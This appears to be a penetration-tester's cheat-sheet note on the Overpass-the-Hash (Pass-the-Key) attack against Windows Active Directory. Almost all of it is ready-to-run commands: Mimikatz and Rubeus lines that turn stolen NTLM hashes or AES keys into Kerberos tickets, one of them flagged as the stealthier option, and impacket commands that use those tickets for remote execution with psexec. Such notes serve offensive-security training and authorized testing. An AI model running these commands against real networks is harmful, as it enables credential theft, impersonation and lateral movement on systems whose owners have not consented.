---
tags:
  - Foundational
  - Privilege_Escalation
  - Windows
---

## Overpass-the-Hash
resources: [HackTricks Overpass-the-Hash](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key)

> [!info] Use an NTLM hash or AES key to request a Kerberos TGT. Allows Kerberos authentication with just a hash. Also called Pass-the-Key.

### Overpass-the-Hash with Mimikatz [Remote]
> [!tip] Starts a new process with the injected ticket.

```powershell
.\mimikatz.exe "sekurlsa::pth /user:<Username> /domain:<Domain> /ntlm:<NTLMHash> /run:cmd.exe" "exit"
```

```powershell
# With AES256 key (more stealthy)
.\mimikatz.exe "sekurlsa::pth /user:<Username> /domain:<Domain> /aes256:<AES256Key> /run:cmd.exe" "exit"
```

```powershell
# With AES128 key
.\mimikatz.exe "sekurlsa::pth /user:<Username> /domain:<Domain> /aes128:<AES128Key> /run:cmd.exe" "exit"
```

### Overpass-the-Hash with Rubeus [alternative]
```powershell
.\Rubeus.exe asktgt /user:<Username> /rc4:<NTLMHash> /ptt
```

```powershell
# With AES256 key
.\Rubeus.exe asktgt /user:<Username> /aes256:<AES256Key> /ptt
```

```powershell
# Request and save to file
.\Rubeus.exe asktgt /user:<Username> /rc4:<NTLMHash> /outfile:tgt.kirbi
```

### Overpass-the-Hash from Kali [Local]
```bash
impacket-getTGT <Domain>/<Username> -hashes :<NTLMHash> -dc-ip <DCIP>
```

```bash
# Use the ticket
export KRB5CCNAME=<Username>.ccache
impacket-psexec -k -no-pass <Domain>/<Username>@<TargetFQDN>
```

### Verify Ticket
```powershell
klist
```
